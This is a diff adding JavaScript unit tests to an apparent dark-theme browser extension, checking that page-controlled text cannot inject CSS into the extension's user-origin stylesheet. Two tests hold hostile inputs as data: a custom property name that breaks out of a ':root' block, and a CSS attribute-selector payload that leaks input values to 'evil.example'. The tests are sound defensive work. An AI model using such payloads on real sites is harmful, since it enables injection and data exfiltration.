@@ -261,6 +261,113 @@ test('emitted CSS has no unbalanced braces', () => {
   assert.equal((css.match(/{/g) || []).length, (css.match(/}/g) || []).length);
 });
 
+// --- reading the page back -------------------------------------------------
+
+/**
+ * A page stubbed down to what the read phase actually touches: elements that
+ * carry their own computed colours, and the two collaborators tiers.js reaches
+ * for while reading. `mirror` is the flag under test, so the caller drives it.
+ */
+function stubPage() {
+  const NX = loadLibs(['color', 'theme', 'signals', 'content/tiers'], {
+    document: { styleSheets: [], querySelectorAll: () => [] },
+    getComputedStyle: (el) => el.computed,
+    SVGElement: class {},
+  });
+  const written = [];
+  let mirror = false;
+
+  NX.sheet = {
+    isOurs: () => false,
+    withoutOurs: (ids, fn) => fn(),
+    set: (id, css) => written.push(css),
+    remove: () => {},
+    mirrorLive: () => mirror,
+  };
+  NX.probe = { withoutGuard: (fn) => fn() };
+
+  return {
+    tiers: NX.tiers,
+    written,
+    setMirror: (live) => {
+      mirror = live;
+    },
+    /** One element, optionally already carrying a tag from an earlier sweep. */
+    element: (color, background, tag) => ({
+      tagName: 'DIV',
+      nodeType: 1,
+      isConnected: true,
+      computed: {
+        color,
+        backgroundColor: background,
+        borderTopColor: '',
+        borderRightColor: '',
+        borderBottomColor: '',
+        borderLeftColor: '',
+        outlineColor: '',
+        boxShadow: 'none',
+        backgroundImage: 'none',
+        fill: '',
+        stroke: '',
+      },
+      attrs: tag == null ? {} : { 'data-nx': tag },
+      getAttribute(name) {
+        return name in this.attrs ? this.attrs[name] : null;
+      },
+      setAttribute(name, value) {
+        this.attrs[name] = value;
+      },
+      hasAttribute(name) {
+        return name in this.attrs;
+      },
+    }),
+  };
+}
+
+test('an element the user-origin mirror already paints is not read again', () => {
+  /*
+   * The mirror is a copy of our own rules at the one origin this document
+   * cannot suspend: sheet.withoutOurs flips `media`, and the worker inserted
+   * that sheet rather than this document. So while it is up, a tagged element
+   * computes to the colour Nocturne gave it, and mapping that a second time
+   * walks the surface up the ramp until a card and the page behind it meet.
+   */
+  const page = stubPage();
+  page.setMirror(true);
+
+  const themed = page.element('rgb(198, 204, 211)', 'rgb(15, 19, 24)', '7');
+  assert.equal(page.tiers.computeOn([themed], t), null);
+  assert.equal(themed.getAttribute('data-nx'), '7', 'the tag it already had must survive');
+  assert.deepEqual(page.written, [], 'and nothing new to write');
+});
+
+test('content that has never been swept is still read while the mirror is up', () => {
+  // The whole point of the skip above is that it is exact: `[data-nx]` is the
+  // only hook the mirror's compute rules have, so an untagged element reads
+  // the page's own colours exactly as it would on the first climb. Anything
+  // painted after hydration arrives this way, and on a stubborn site it is the
+  // only content that can still be themed.
+  const page = stubPage();
+  page.setMirror(true);
+
+  const late = page.element('rgb(5, 5, 5)', 'rgb(253, 253, 253)');
+  assert.equal(page.tiers.computeOn([late], t).elements, 1);
+  assert.equal(late.getAttribute('data-nx'), '0');
+  assert.equal(page.written.length, 1, 'the sheet has to grow for the mirror to carry it');
+  assert.ok(page.written[0].includes('[data-nx="0"]'), page.written[0]);
+});
+
+test('with no mirror up, a tagged element is read again', () => {
+  // Without the mirror there is nothing unsuspendable left, so re-reading is
+  // both safe and wanted: it is what re-themes a page that recolours itself.
+  const page = stubPage();
+  page.setMirror(false);
+
+  const themed = page.element('rgb(0, 0, 0)', 'rgb(255, 255, 255)', '7');
+  assert.equal(page.tiers.computeOn([themed], t).elements, 1);
+  assert.equal(themed.getAttribute('data-nx'), '0', 're-tagged against the live index');
+});
+
 // --- site signals ----------------------------------------------------------
 
 test('framework dark-theme conventions are detected from selector text', () => {
@@ -286,4 +393,217 @@ test('a page with no dark convention matches nothing', () => {
   assert.deepEqual(Array.from(signals.detect('.darkroom { color: red }')), []);
   // Nor should a light-theme selector.
   assert.deepEqual(Array.from(signals.detect('[data-theme="light"] {}')), []);
+});
+
+// --- the page's own text never becomes our CSS -----------------------------
+
+/**
+ * A root element whose custom properties are named by the page.
+ *
+ * `Array.from(getComputedStyle(el))` is how the token tier finds them, and it
+ * hands the name back with its escapes already resolved: `--a\}b` is declared
+ * escaped and enumerated as `--a}b`. So the page, not Nocturne, decides what
+ * that text is.
+ */
+function stubRoot(names, { value = '#123456', escape = null } = {}) {
+  const computed = Object.assign([...names], {
+    getPropertyValue: () => value,
+  });
+  const globals = {
+    document: { documentElement: {}, styleSheets: [], querySelectorAll: () => [] },
+    getComputedStyle: () => computed,
+    SVGElement: class {},
+  };
+  // Both paths matter and they differ: with CSS.escape the name is put back
+  // the way the page wrote it, without it the name is dropped instead.
+  if (escape) globals.CSS = { escape };
+  const NX = loadLibs(['color', 'theme', 'signals', 'content/tiers'], globals);
+  const written = [];
+  NX.sheet = { set: (id, css) => written.push(css), remove: () => {} };
+  NX.probe = { measure: () => ({ ok: true }), withoutGuard: (fn) => fn() };
+  return { tiers: NX.tiers, written };
+}
+
+/**
+ * A `}` that ends the block, as CSS parses it rather than as a substring
+ * search sees it. An escaped one is a literal inside an identifier.
+ */
+function closesEarly(css) {
+  for (let i = 0; i < css.length - 1; i++) {
+    if (css[i] === '\\') {
+      i++;
+      continue;
+    }
+    if (css[i] === '}') return true;
+  }
+  return false;
+}
+
+test('a page cannot choose the text that goes into the token stylesheet', () => {
+  /*
+   * A custom property name is an identifier, and an identifier may contain
+   * anything at all as long as it is escaped. Splicing the enumerated name
+   * straight into `:root{ ... }` therefore let a page close that block early
+   * and write rules of its own into a stylesheet Nocturne owns. Under the
+   * stubborn-sites option that sheet is mirrored to USER origin, which
+   * outranks every rule the page can write for itself and is not subject to
+   * the page's own content security policy, so the page gains reach it does
+   * not otherwise have over its own document.
+   */
+  const hostile = '--pwn}html,body{background:#000}h1{color:#00ff00}q';
+  const names = ['--card-bg', '--page-bg', hostile, '--border'];
+  // Escaping every character that is not an ident character is what a real
+  // CSS.escape does to a name like this one.
+  const escape = (s) => s.replace(/[^A-Za-z0-9_-]/g, (c) => `\\${c}`);
+
+  for (const [label, page] of [
+    ['dropped where CSS.escape is unavailable', stubRoot(names)],
+    ['escaped where it is', stubRoot(names, { escape })],
+  ]) {
+    page.tiers.tryTokens({ palette: 'nocturne', minContrast: 4.5 });
+    assert.equal(page.written.length, 1, label);
+    const css = page.written[0];
+    assert.ok(css.startsWith(':root{'), `${label}: ${css}`);
+    assert.ok(!closesEarly(css), `${label}: the block is closed early: ${css}`);
+    assert.ok(!/[^\\]\{color/.test(css), `${label}: page rules reached our sheet: ${css}`);
+  }
+});
+
+test('ordinary custom property names still make it through', () => {
+  const wanted = ['--card-bg', '--page-bg', '--text-muted', '--brand-500'];
+  const page = stubRoot(wanted);
+  page.tiers.tryTokens({ palette: 'nocturne', minContrast: 4.5 });
+  const css = page.written[0];
+  for (const name of wanted) {
+    assert.ok(css.includes(`${name}:`), `${name} should still be remapped: ${css}`);
+  }
+});
+
+// --- what gets mirrored to USER origin -------------------------------------
+
+/** Enough DOM for sheet.js: a head that holds style elements. */
+function stubDocument() {
+  const head = { childNodes: [] };
+  head.appendChild = (el) => {
+    if (el.parentNode) el.parentNode.removeChild(el);
+    head.childNodes.push(el);
+    el.parentNode = head;
+    el.isConnected = true;
+    return el;
+  };
+  head.removeChild = (el) => {
+    head.childNodes = head.childNodes.filter((c) => c !== el);
+    el.parentNode = null;
+    el.isConnected = false;
+  };
+  return {
+    head,
+    documentElement: head,
+    createElement: () => ({
+      textContent: '',
+      media: '',
+      isConnected: false,
+      parentNode: null,
+      attrs: {},
+      setAttribute(name, value) {
+        this.attrs[name] = value;
+      },
+      hasAttribute(name) {
+        return name in this.attrs;
+      },
+    }),
+    querySelectorAll: () => head.childNodes,
+    styleSheets: [],
+  };
+}
+
+test('the text mirrored to USER origin is ours, not whatever is in the element', () => {
+  /*
+   * The stubborn-sites mirror is the same declarations re-inserted at USER
+   * origin, which outranks everything the page can write for itself and is
+   * not subject to the page's own content security policy. Reading the text
+   * back off the injected element let the page choose it: overwrite the
+   * textContent of one of our own style elements and the next sync hands that
+   * to the worker to insert at that origin. A page could reach its own
+   * document in a way it otherwise cannot, and CSS can address attribute
+   * values and fetch a background image from them.
+   *
+   * The sheet knows what it was asked to write, so that is what it reports.
+   */
+  const NX = loadLibs(['color', 'theme', 'signals', 'content/sheet'], {
+    document: stubDocument(),
+  });
+
+  NX.sheet.set('computed', '[data-nx="0"]{color:rgb(1, 2, 3)}');
+  NX.sheet.set('filter', 'html{filter:invert(1)}');
+  assert.ok(NX.sheet.ours().includes('[data-nx="0"]'), NX.sheet.ours());
+  assert.ok(NX.sheet.ours().includes('invert(1)'), NX.sheet.ours());
+
+  // The page rewrites one of our sheets in place.
+  const hijacked = NX.sheet.elements.get('filter');
+  hijacked.textContent = 'input[value^="a"]{background:url(https://evil.example/a)}';
+
+  const mirrored = NX.sheet.ours();
+  assert.ok(!mirrored.includes('evil.example'), `page text reached the mirror: ${mirrored}`);
+  assert.ok(mirrored.includes('invert(1)'), mirrored);
+});
+
+test('a removed sheet stops being mirrored', () => {
+  const NX = loadLibs(['color', 'theme', 'signals', 'content/sheet'], {
+    document: stubDocument(),
+  });
+  NX.sheet.set('tokens', ':root{--a:rgb(0, 0, 0)}');
+  NX.sheet.set('filter', 'html{filter:invert(1)}');
+  NX.sheet.remove('tokens');
+  assert.ok(!NX.sheet.ours().includes('--a'), NX.sheet.ours());
+
+  NX.sheet.clearAll();
+  assert.equal(NX.sheet.ours(), '');
+});
+
+// --- what a mutation batch actually covers ---------------------------------
+
+/** observe.js with a MutationObserver whose callback the test can fire. */
+function stubObserver() {
+  const holder = {};
+  const NX = loadLibs(['signals', 'content/observe'], {
+    MutationObserver: class {
+      constructor(fn) {
+        holder.fire = fn;
+      }
+      observe() {}
+      disconnect() {}
+      takeRecords() {
+        return [];
+      }
+    },
+    document: { documentElement: {} },
+    Date,
+    setTimeout,
+  });
+  NX.sheet = { isOurs: () => false };
+  return { observe: NX.observe, fire: (records) => holder.fire(records) };
+}
+
+test('a subtree added in one go is queued whole, not truncated', () => {
+  /*
+   * A rendered table, a comment thread or an article body arrives as one
+   * subtree, and the cap here used to be 500. Measured on a page on the
+   * compute rung: of 800 rows appended in a single call, exactly 500 came out
+   * themed and the rest kept the site's own light colours, on a page that
+   * reported itself fully themed. Nothing went back for them either, because
+   * only mutated nodes are revisited and these had already been seen.
+   */
+  const kids = Array.from({ length: 800 }, (unused, i) => ({ nodeType: 1, id: i }));
+  const root = { nodeType: 1, id: 'root', querySelectorAll: () => kids };
+
+  const { observe, fire } = stubObserver();
+  observe.start(() => {}, () => {});
+  fire([{ type: 'childList', addedNodes: [root], target: root }]);
+
+  assert.equal(
+    observe.state.pending.size,
+    801,
+    `the whole subtree plus its root, got ${observe.state.pending.size}`
+  );
 });
